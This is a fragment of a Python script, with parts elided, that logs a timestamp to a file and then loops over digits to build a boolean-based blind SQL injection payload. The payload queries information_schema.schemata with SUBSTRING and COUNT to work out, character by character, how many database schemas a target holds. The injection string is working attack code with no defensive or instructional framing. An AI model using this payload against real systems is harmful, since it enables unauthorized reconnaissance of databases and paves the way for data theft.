...
out = open("countschema.txt","w")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime+"\n")
out.close()
out = open("countschema.txt","a")
...
while not isCountFinished:
    for letter in numbers:
        injection = "a' OR IF('"+letter+"'=(SELECT SUBSTRING(COUNT(schema_name),"+str(char)+",1) FROM information_schema.schemata),1,'a'); -- "
